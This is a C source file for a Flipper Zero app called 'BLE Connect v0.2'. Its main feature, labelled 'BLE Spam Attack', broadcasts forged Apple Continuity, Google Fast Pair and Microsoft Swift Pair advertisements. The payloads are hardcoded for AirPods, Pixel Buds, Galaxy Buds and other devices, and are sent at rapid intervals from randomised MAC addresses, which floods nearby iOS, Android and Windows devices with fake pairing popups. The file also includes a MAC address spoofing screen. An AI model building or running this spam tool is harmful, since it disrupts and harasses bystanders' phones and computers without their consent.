/**
 * BLE Connect v0.2 - Flipper Zero Native App
 *
 * Full-featured BLE toolkit: beacon spam, MAC spoofing, device scanner.
 * Uses furi_hal_bt_extra_beacon_* for BLE advertising operations.
 *
 * Compile: cd ble_connect && ufbt
 * Install: copy dist/ble_connect.fap -> SD/apps/Bluetooth/
 *
 * Requires Momentum firmware or compatible.
 * Author: kingdamienjl
 */

#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_bt.h>
#include <furi_hal_random.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/popup.h>
#include <gui/modules/widget.h>
#include <gui/modules/variable_item_list.h>
#include <gui/modules/text_input.h>
#include <gui/modules/loading.h>
#include <notification/notification_messages.h>

#include <bt/bt_service/bt.h>

// ============================================================
// View IDs
// ============================================================
typedef enum {
    ViewMainMenu,
    ViewSpamMenu,
    ViewSpamStatus,
    ViewBeaconConfig,
    ViewMacInput,
    ViewMacStatus,
    ViewScanInfo,
    ViewAbout,
    ViewLoading,
    ViewPopup,
} BleViewId;

// ============================================================
// Main Menu Items
// ============================================================
typedef enum {
    MenuItemSpam,
    MenuItemMacSpoof,
    MenuItemScanDevices,
    MenuItemBeaconConfig,
    MenuItemAbout,
} MainMenuItem;

// ============================================================
// Spam Menu Items
// ============================================================
typedef enum {
    SpamItemApple,
    SpamItemAndroid,
    SpamItemWindows,
    SpamItemAll,
    SpamItemStop,
} SpamMenuItem;

// ============================================================
// Apple Continuity Payloads (Proximity Pairing, type 0x07)
// ============================================================
#define APPLE_PAYLOAD_COUNT 10
#define APPLE_PAYLOAD_SIZE  31

// Device model bytes at offset [7] in the payload
static const uint8_t apple_device_models[APPLE_PAYLOAD_COUNT] = {
    0x02, // AirPods
    0x0E, // AirPods Pro
    0x0A, // AirPods Max
    0x13, // AirPods Gen3
    0x12, // Beats Fit Pro
    0x0B, // Beats Solo Pro
    0x14, // AppleTV Setup
    0x09, // AppleTV Keyboard
    0x05, // New Device
    0x0F, // Transfer Number
};

static const char* apple_device_names[APPLE_PAYLOAD_COUNT] = {
    "AirPods",
    "AirPods Pro",
    "AirPods Max",
    "AirPods Gen3",
    "Beats Fit Pro",
    "Beats Solo Pro",
    "AppleTV Setup",
    "AppleTV Key",
    "New Device",
    "Transfer Num",
};

// Base Apple Continuity payload template
static const uint8_t apple_payload_template[APPLE_PAYLOAD_SIZE] = {
    0x1E, 0xFF, 0x4C, 0x00, // Len, Mfr Specific, Apple ID
    0x07, 0x19,             // Proximity Pairing, len=25
    0x07,                   // Prefix
    0x00,                   // Device model (filled per-device)
    0x20, 0x75, 0xAA, 0x30, // Status bytes
    0x01, 0x00, 0x00, 0x45, // Pairing data
    0x12, 0x12, 0x12, 0x00, // Filler
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00,       // Randomized trailing bytes
};

// ============================================================
// Google Fast Pair Payloads
// ============================================================
#define GOOGLE_PAYLOAD_COUNT 8
#define GOOGLE_PAYLOAD_SIZE  11

static const uint8_t google_payloads[GOOGLE_PAYLOAD_COUNT][GOOGLE_PAYLOAD_SIZE] = {
    {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0xD8, 0xB0, 0x01}, // Pixel Buds
    {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0x82, 0xB1, 0x03}, // Pixel Buds Pro
    {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0xCD, 0x81, 0x02}, // Galaxy Buds2
    {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0x2D, 0x7A, 0x03}, // Galaxy Buds Live
    {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0xE5, 0x4B, 0x23}, // Galaxy Buds Pro
    {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0xC9, 0x58, 0x05}, // Sony WF-1000XM4
    {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0xD4, 0x46, 0x02}, // JBL Tune Flex
    {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0x00, 0x7C, 0x01}, // Nothing Ear 1
};

static const char* google_device_names[GOOGLE_PAYLOAD_COUNT] = {
    "Pixel Buds",    "Pixel Buds Pro",
    "Galaxy Buds2",  "Galaxy Buds Live",
    "Galaxy Buds Pro", "Sony WF-1000XM4",
    "JBL Tune Flex", "Nothing Ear 1",
};

// ============================================================
// Microsoft Swift Pair Payload
// ============================================================
#define WINDOWS_PAYLOAD_SIZE 8

static const uint8_t windows_payload[WINDOWS_PAYLOAD_SIZE] = {
    0x07, 0xFF,       // Len, Mfr Specific
    0x06, 0x00,       // Microsoft Vendor ID
    0x03,             // Swift Pair scenario
    0x00,             // Reserved
    0x80,             // Flags
    0x00,             // Reserved
};

// ============================================================
// App State
// ============================================================
typedef struct {
    // Core
    Gui* gui;
    NotificationApp* notifications;
    ViewDispatcher* view_dispatcher;

    // Views
    Submenu* main_menu;
    Submenu* spam_menu;
    Widget* spam_status;
    VariableItemList* beacon_config;
    TextInput* mac_input;
    Widget* mac_status;
    Widget* scan_info;
    Widget* about_view;
    Loading* loading;
    Popup* popup;

    // BLE Spam State
    FuriTimer* spam_timer;
    bool spam_active;
    uint32_t spam_count;
    uint8_t spam_mode;   // 0=Apple, 1=Android, 2=Windows, 3=All
    uint8_t device_idx;

    // MAC Spoof State
    char mac_input_buf[18]; // "AA:BB:CC:DD:EE:FF\0"
    uint8_t spoof_mac[6];
    bool mac_spoofed;

    // Beacon Config
    uint8_t beacon_power;   // 0-6
    uint8_t beacon_interval; // index into interval table
} BleConnectApp;

// Beacon power levels
static const char* power_names[] = {
    "-40dBm", "-20dBm", "-16dBm", "-12dBm", "-8dBm", "-4dBm", "0dBm"};
#define POWER_COUNT 7

// Beacon intervals (ms)
static const uint16_t interval_values[] = {20, 50, 100, 200, 500, 1000};
static const char* interval_names[] = {
    "20ms", "50ms", "100ms", "200ms", "500ms", "1000ms"};
#define INTERVAL_COUNT 6

// ============================================================
// Utility: Random MAC Address
// ============================================================
static void generate_random_mac(uint8_t mac[6]) {
    furi_hal_random_fill_buf(mac, 6);
    mac[0] = (mac[0] | 0x02) & 0xFE; // locally administered, unicast
}

// ============================================================
// Utility: Format MAC to string
// ============================================================
static void mac_to_string(const uint8_t mac[6], char* buf, size_t buf_size) {
    snprintf(
        buf,
        buf_size,
        "%02X:%02X:%02X:%02X:%02X:%02X",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// ============================================================
// Utility: Parse MAC from "AABBCCDDEEFF" string
// ============================================================
static bool parse_mac_string(const char* str, uint8_t mac[6]) {
    if(strlen(str) < 12) return false;
    for(int i = 0; i < 6; i++) {
        char hex[3] = {str[i * 2], str[i * 2 + 1], 0};
        unsigned int val;
        if(sscanf(hex, "%02x", &val) != 1) return false;
        mac[i] = (uint8_t)val;
    }
    return true;
}

// ============================================================
// BLE Beacon Operations
// ============================================================
static void ble_send_apple_beacon(BleConnectApp* app, uint8_t device_idx) {
    uint8_t payload[APPLE_PAYLOAD_SIZE];
    memcpy(payload, apple_payload_template, APPLE_PAYLOAD_SIZE);
    payload[7] = apple_device_models[device_idx % APPLE_PAYLOAD_COUNT];

    // Randomize trailing bytes for uniqueness
    furi_hal_random_fill_buf(&payload[18], 13);

    uint8_t mac[6];
    generate_random_mac(mac);

    GapExtraBeaconConfig config = {
        .adv_channel_map = GapAdvChannelMapAll,
        .adv_power_level = app->beacon_power,
        .min_adv_interval_ms = interval_values[app->beacon_interval],
        .max_adv_interval_ms = interval_values[app->beacon_interval] + 10,
    };
    memcpy(config.address, mac, 6);

    furi_hal_bt_extra_beacon_stop();
    furi_hal_bt_extra_beacon_set_config(&config);
    furi_hal_bt_extra_beacon_set_data(payload, APPLE_PAYLOAD_SIZE);
    furi_hal_bt_extra_beacon_start();
}

static void ble_send_google_beacon(BleConnectApp* app, uint8_t device_idx) {
    uint8_t idx = device_idx % GOOGLE_PAYLOAD_COUNT;

    uint8_t mac[6];
    generate_random_mac(mac);

    GapExtraBeaconConfig config = {
        .adv_channel_map = GapAdvChannelMapAll,
        .adv_power_level = app->beacon_power,
        .min_adv_interval_ms = interval_values[app->beacon_interval],
        .max_adv_interval_ms = interval_values[app->beacon_interval] + 10,
    };
    memcpy(config.address, mac, 6);

    furi_hal_bt_extra_beacon_stop();
    furi_hal_bt_extra_beacon_set_config(&config);
    furi_hal_bt_extra_beacon_set_data(google_payloads[idx], GOOGLE_PAYLOAD_SIZE);
    furi_hal_bt_extra_beacon_start();
}

static void ble_send_windows_beacon(BleConnectApp* app) {
    uint8_t mac[6];
    generate_random_mac(mac);

    GapExtraBeaconConfig config = {
        .adv_channel_map = GapAdvChannelMapAll,
        .adv_power_level = app->beacon_power,
        .min_adv_interval_ms = interval_values[app->beacon_interval],
        .max_adv_interval_ms = interval_values[app->beacon_interval] + 10,
    };
    memcpy(config.address, mac, 6);

    furi_hal_bt_extra_beacon_stop();
    furi_hal_bt_extra_beacon_set_config(&config);
    furi_hal_bt_extra_beacon_set_data(windows_payload, WINDOWS_PAYLOAD_SIZE);
    furi_hal_bt_extra_beacon_start();
}

// ============================================================
// Spam Timer Callback (runs periodically)
// ============================================================
static void spam_timer_callback(void* context) {
    BleConnectApp* app = context;
    if(!app->spam_active) return;

    uint8_t total_apple = APPLE_PAYLOAD_COUNT;
    uint8_t total_google = GOOGLE_PAYLOAD_COUNT;
    uint8_t total = total_apple + total_google + 1;

    switch(app->spam_mode) {
    case 0: // Apple
        ble_send_apple_beacon(app, app->device_idx);
        break;
    case 1: // Android
        ble_send_google_beacon(app, app->device_idx);
        break;
    case 2: // Windows
        ble_send_windows_beacon(app);
        break;
    case 3: // All
    default: {
        uint8_t pick = app->device_idx % total;
        if(pick < total_apple) {
            ble_send_apple_beacon(app, pick);
        } else if(pick < total_apple + total_google) {
            ble_send_google_beacon(app, pick - total_apple);
        } else {
            ble_send_windows_beacon(app);
        }
    } break;
    }

    app->device_idx++;
    app->spam_count++;

    // Blink blue LED
    notification_message(app->notifications, &sequence_blink_blue_10);

    // Update status widget
    widget_reset(app->spam_status);

    // Header bar
    widget_add_frame_element(app->spam_status, 0, 0, 128, 14);
    widget_add_string_element(
        app->spam_status, 64, 11, AlignCenter, AlignBottom, FontPrimary, "BLE SPAM ACTIVE");

    // Status info
    const char* mode_str = "All";
    if(app->spam_mode == 0) mode_str = "Apple";
    else if(app->spam_mode == 1) mode_str = "Android";
    else if(app->spam_mode == 2) mode_str = "Windows";

    char line1[40];
    snprintf(line1, sizeof(line1), "Mode: %s", mode_str);
    widget_add_string_element(
        app->spam_status, 4, 28, AlignLeft, AlignBottom, FontSecondary, line1);

    char line2[40];
    snprintf(line2, sizeof(line2), "Packets: %lu", (unsigned long)app->spam_count);
    widget_add_string_element(
        app->spam_status, 4, 40, AlignLeft, AlignBottom, FontSecondary, line2);

    // Current device being spoofed
    const char* dev_name = "Windows Device";
    if(app->spam_mode == 0) {
        dev_name = apple_device_names[(app->device_idx - 1) % APPLE_PAYLOAD_COUNT];
    } else if(app->spam_mode == 1) {
        dev_name = google_device_names[(app->device_idx - 1) % GOOGLE_PAYLOAD_COUNT];
    } else if(app->spam_mode == 3) {
        uint8_t pick = (app->device_idx - 1) % total;
        if(pick < total_apple) dev_name = apple_device_names[pick];
        else if(pick < total_apple + total_google)
            dev_name = google_device_names[pick - total_apple];
    }

    char line3[40];
    snprintf(line3, sizeof(line3), "Device: %s", dev_name);
    widget_add_string_element(
        app->spam_status, 4, 52, AlignLeft, AlignBottom, FontSecondary, line3);

    // Bottom hint
    widget_add_string_element(
        app->spam_status, 64, 63, AlignCenter, AlignBottom, FontSecondary, "[BACK] to stop");
}

// ============================================================
// Start/Stop Spam
// ============================================================
static void spam_start(BleConnectApp* app, uint8_t mode) {
    app->spam_mode = mode;
    app->spam_active = true;
    app->spam_count = 0;
    app->device_idx = 0;

    // Trigger first beacon immediately
    spam_timer_callback(app);

    // Start periodic timer
    furi_timer_start(app->spam_timer, interval_values[app->beacon_interval]);

    view_dispatcher_switch_to_view(app->view_dispatcher, ViewSpamStatus);
}

static void spam_stop(BleConnectApp* app) {
    app->spam_active = false;
    furi_timer_stop(app->spam_timer);
    furi_hal_bt_extra_beacon_stop();
    notification_message(app->notifications, &sequence_success);
}

// ============================================================
// Navigation Callbacks
// ============================================================
static uint32_t nav_main_menu(void* ctx) {
    UNUSED(ctx);
    return ViewMainMenu;
}

static uint32_t nav_exit(void* ctx) {
    UNUSED(ctx);
    return VIEW_NONE;
}

static uint32_t nav_spam_stop_and_back(void* ctx) {
    // This is called when back is pressed on spam status view
    // We need to stop spam, but we can't access app from here directly
    // The ViewDispatcher will call this, then we handle cleanup in the
    // main menu's on_enter or via custom event
    UNUSED(ctx);
    return ViewSpamMenu;
}

// ============================================================
// Main Menu Callback
// ============================================================
static void main_menu_callback(void* context, uint32_t index) {
    BleConnectApp* app = context;
    switch(index) {
    case MenuItemSpam:
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewSpamMenu);
        break;
    case MenuItemMacSpoof:
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMacInput);
        break;
    case MenuItemScanDevices:
        // Build scan info widget
        widget_reset(app->scan_info);
        widget_add_frame_element(app->scan_info, 0, 0, 128, 14);
        widget_add_string_element(
            app->scan_info, 64, 11, AlignCenter, AlignBottom, FontPrimary, "BLE SCAN");
        widget_add_string_element(
            app->scan_info,
            64,
            26,
            AlignCenter,
            AlignBottom,
            FontSecondary,
            "BLE scanning requires");
        widget_add_string_element(
            app->scan_info,
            64,
            37,
            AlignCenter,
            AlignBottom,
            FontSecondary,
            "HCI central mode which");
        widget_add_string_element(
            app->scan_info,
            64,
            48,
            AlignCenter,
            AlignBottom,
            FontSecondary,
            "is not yet exposed in");
        widget_add_string_element(
            app->scan_info,
            64,
            59,
            AlignCenter,
            AlignBottom,
            FontSecondary,
            "the Flipper BLE HAL.");
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewScanInfo);
        break;
    case MenuItemBeaconConfig:
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewBeaconConfig);
        break;
    case MenuItemAbout:
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewAbout);
        break;
    }
}

// ============================================================
// Spam Menu Callback
// ============================================================
static void spam_menu_callback(void* context, uint32_t index) {
    BleConnectApp* app = context;
    switch(index) {
    case SpamItemApple:
        spam_start(app, 0);
        break;
    case SpamItemAndroid:
        spam_start(app, 1);
        break;
    case SpamItemWindows:
        spam_start(app, 2);
        break;
    case SpamItemAll:
        spam_start(app, 3);
        break;
    case SpamItemStop:
        spam_stop(app);
        popup_set_header(app->popup, "Stopped", 64, 20, AlignCenter, AlignCenter);
        popup_set_text(app->popup, "BLE spam stopped", 64, 40, AlignCenter, AlignCenter);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewPopup);
        break;
    }
}

// ============================================================
// MAC Input Callback
// ============================================================
static void mac_input_callback(void* context) {
    BleConnectApp* app = context;

    // Parse input (expect "AABBCCDDEEFF" format, 12 hex chars)
    if(parse_mac_string(app->mac_input_buf, app->spoof_mac)) {
        app->mac_spoofed = true;

        // Build status widget
        widget_reset(app->mac_status);
        widget_add_frame_element(app->mac_status, 0, 0, 128, 14);
        widget_add_string_element(
            app->mac_status, 64, 11, AlignCenter, AlignBottom, FontPrimary, "MAC SPOOFED");

        char mac_str[20];
        mac_to_string(app->spoof_mac, mac_str, sizeof(mac_str));
        widget_add_string_element(
            app->mac_status, 64, 32, AlignCenter, AlignBottom, FontSecondary, mac_str);
        widget_add_string_element(
            app->mac_status,
            64,
            46,
            AlignCenter,
            AlignBottom,
            FontSecondary,
            "Beacon will use this");
        widget_add_string_element(
            app->mac_status,
            64,
            57,
            AlignCenter,
            AlignBottom,
            FontSecondary,
            "MAC for advertising");

        notification_message(app->notifications, &sequence_success);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMacStatus);
    } else {
        popup_set_header(app->popup, "Error", 64, 20, AlignCenter, AlignCenter);
        popup_set_text(
            app->popup, "Invalid MAC format\nUse: AABBCCDDEEFF", 64, 40, AlignCenter, AlignCenter);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewPopup);
    }
}

// ============================================================
// Beacon Config Callbacks
// ============================================================
static void beacon_power_changed(VariableItem* item) {
    BleConnectApp* app = variable_item_get_context(item);
    uint8_t idx = variable_item_get_current_value_index(item);
    app->beacon_power = idx;
    variable_item_set_current_value_text(item, power_names[idx]);
}

static void beacon_interval_changed(VariableItem* item) {
    BleConnectApp* app = variable_item_get_context(item);
    uint8_t idx = variable_item_get_current_value_index(item);
    app->beacon_interval = idx;
    variable_item_set_current_value_text(item, interval_names[idx]);
}

// ============================================================
// Custom ViewDispatcher callback for spam status back button
// ============================================================
static bool spam_status_back_handler(void* context) {
    BleConnectApp* app = context;
    if(app->spam_active) {
        spam_stop(app);
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewSpamMenu);
    return true;
}

// ============================================================
// App Alloc
// ============================================================
static BleConnectApp* ble_connect_app_alloc(void) {
    BleConnectApp* app = malloc(sizeof(BleConnectApp));
    memset(app, 0, sizeof(BleConnectApp));

    // Defaults
    app->beacon_power = 6;    // 0dBm (max)
    app->beacon_interval = 2; // 100ms
    strncpy(app->mac_input_buf, "AABBCCDDEEFF", sizeof(app->mac_input_buf));

    // Core services
    app->gui = furi_record_open(RECORD_GUI);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);

    // ViewDispatcher
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    // ---- Main Menu ----
    app->main_menu = submenu_alloc();
    submenu_set_header(app->main_menu, "BLE Connect v0.2");
    submenu_add_item(app->main_menu, "  BLE Spam Attack", MenuItemSpam, main_menu_callback, app);
    submenu_add_item(
        app->main_menu, "  MAC Address Spoof", MenuItemMacSpoof, main_menu_callback, app);
    submenu_add_item(
        app->main_menu, "  Scan Devices", MenuItemScanDevices, main_menu_callback, app);
    submenu_add_item(
        app->main_menu, "  Beacon Settings", MenuItemBeaconConfig, main_menu_callback, app);
    submenu_add_item(app->main_menu, "  About", MenuItemAbout, main_menu_callback, app);
    view_set_previous_callback(submenu_get_view(app->main_menu), nav_exit);
    view_dispatcher_add_view(
        app->view_dispatcher, ViewMainMenu, submenu_get_view(app->main_menu));

    // ---- Spam Submenu ----
    app->spam_menu = submenu_alloc();
    submenu_set_header(app->spam_menu, "Select Target");
    submenu_add_item(
        app->spam_menu, "  Apple (iOS popups)", SpamItemApple, spam_menu_callback, app);
    submenu_add_item(
        app->spam_menu, "  Android (Fast Pair)", SpamItemAndroid, spam_menu_callback, app);
    submenu_add_item(
        app->spam_menu, "  Windows (Swift Pair)", SpamItemWindows, spam_menu_callback, app);
    submenu_add_item(
        app->spam_menu, "  All Devices", SpamItemAll, spam_menu_callback, app);
    submenu_add_item(
        app->spam_menu, "  Stop Spam", SpamItemStop, spam_menu_callback, app);
    view_set_previous_callback(submenu_get_view(app->spam_menu), nav_main_menu);
    view_dispatcher_add_view(
        app->view_dispatcher, ViewSpamMenu, submenu_get_view(app->spam_menu));

    // ---- Spam Status Widget ----
    app->spam_status = widget_alloc();
    view_set_previous_callback(widget_get_view(app->spam_status), nav_spam_stop_and_back);
    view_dispatcher_add_view(
        app->view_dispatcher, ViewSpamStatus, widget_get_view(app->spam_status));

    // ---- Beacon Config (VariableItemList) ----
    app->beacon_config = variable_item_list_alloc();
    VariableItem* item_power = variable_item_list_add(
        app->beacon_config, "TX Power", POWER_COUNT, beacon_power_changed, app);
    variable_item_set_current_value_index(item_power, app->beacon_power);
    variable_item_set_current_value_text(item_power, power_names[app->beacon_power]);

    VariableItem* item_interval = variable_item_list_add(
        app->beacon_config, "Interval", INTERVAL_COUNT, beacon_interval_changed, app);
    variable_item_set_current_value_index(item_interval, app->beacon_interval);
    variable_item_set_current_value_text(item_interval, interval_names[app->beacon_interval]);

    view_set_previous_callback(
        variable_item_list_get_view(app->beacon_config), nav_main_menu);
    view_dispatcher_add_view(
        app->view_dispatcher,
        ViewBeaconConfig,
        variable_item_list_get_view(app->beacon_config));

    // ---- MAC Input ----
    app->mac_input = text_input_alloc();
    text_input_set_header_text(app->mac_input, "Enter MAC (AABBCCDDEEFF):");
    text_input_set_result_callback(
        app->mac_input, mac_input_callback, app, app->mac_input_buf, sizeof(app->mac_input_buf), true);
    view_set_previous_callback(text_input_get_view(app->mac_input), nav_main_menu);
    view_dispatcher_add_view(
        app->view_dispatcher, ViewMacInput, text_input_get_view(app->mac_input));

    // ---- MAC Status Widget ----
    app->mac_status = widget_alloc();
    view_set_previous_callback(widget_get_view(app->mac_status), nav_main_menu);
    view_dispatcher_add_view(
        app->view_dispatcher, ViewMacStatus, widget_get_view(app->mac_status));

    // ---- Scan Info Widget ----
    app->scan_info = widget_alloc();
    view_set_previous_callback(widget_get_view(app->scan_info), nav_main_menu);
    view_dispatcher_add_view(
        app->view_dispatcher, ViewScanInfo, widget_get_view(app->scan_info));

    // ---- About Widget ----
    app->about_view = widget_alloc();
    widget_add_frame_element(app->about_view, 0, 0, 128, 64);
    widget_add_string_element(
        app->about_view, 64, 12, AlignCenter, AlignBottom, FontPrimary, "BLE Connect v0.2");
    widget_add_string_element(
        app->about_view, 64, 26, AlignCenter, AlignBottom, FontSecondary, "BLE Spam & MAC Spoof");
    widget_add_string_element(
        app->about_view, 64, 38, AlignCenter, AlignBottom, FontSecondary, "for Flipper Zero");
    widget_add_string_element(
        app->about_view, 64, 52, AlignCenter, AlignBottom, FontSecondary, "by kingdamienjl");
    widget_add_string_element(
        app->about_view, 64, 62, AlignCenter, AlignBottom, FontSecondary, "Apache 2.0 License");
    view_set_previous_callback(widget_get_view(app->about_view), nav_main_menu);
    view_dispatcher_add_view(
        app->view_dispatcher, ViewAbout, widget_get_view(app->about_view));

    // ---- Loading ----
    app->loading = loading_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, ViewLoading, loading_get_view(app->loading));

    // ---- Popup ----
    app->popup = popup_alloc();
    popup_set_timeout(app->popup, 2000);
    popup_enable_timeout(app->popup);
    view_set_previous_callback(popup_get_view(app->popup), nav_main_menu);
    view_dispatcher_add_view(
        app->view_dispatcher, ViewPopup, popup_get_view(app->popup));

    // ---- Spam Timer ----
    app->spam_timer = furi_timer_alloc(spam_timer_callback, FuriTimerTypePeriodic, app);

    return app;
}

// ============================================================
// App Free
// ============================================================
static void ble_connect_app_free(BleConnectApp* app) {
    // Stop any active spam
    if(app->spam_active) {
        spam_stop(app);
    }
    furi_timer_free(app->spam_timer);

    // Remove all views
    view_dispatcher_remove_view(app->view_dispatcher, ViewMainMenu);
    view_dispatcher_remove_view(app->view_dispatcher, ViewSpamMenu);
    view_dispatcher_remove_view(app->view_dispatcher, ViewSpamStatus);
    view_dispatcher_remove_view(app->view_dispatcher, ViewBeaconConfig);
    view_dispatcher_remove_view(app->view_dispatcher, ViewMacInput);
    view_dispatcher_remove_view(app->view_dispatcher, ViewMacStatus);
    view_dispatcher_remove_view(app->view_dispatcher, ViewScanInfo);
    view_dispatcher_remove_view(app->view_dispatcher, ViewAbout);
    view_dispatcher_remove_view(app->view_dispatcher, ViewLoading);
    view_dispatcher_remove_view(app->view_dispatcher, ViewPopup);

    // Free views
    submenu_free(app->main_menu);
    submenu_free(app->spam_menu);
    widget_free(app->spam_status);
    variable_item_list_free(app->beacon_config);
    text_input_free(app->mac_input);
    widget_free(app->mac_status);
    widget_free(app->scan_info);
    widget_free(app->about_view);
    loading_free(app->loading);
    popup_free(app->popup);

    // Free core
    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);

    free(app);
}

// ============================================================
// Entry Point
// ============================================================
int32_t ble_connect_app(void* p) {
    UNUSED(p);

    BleConnectApp* app = ble_connect_app_alloc();

    view_dispatcher_switch_to_view(app->view_dispatcher, ViewMainMenu);
    view_dispatcher_run(app->view_dispatcher);

    ble_connect_app_free(app);
    return 0;
}
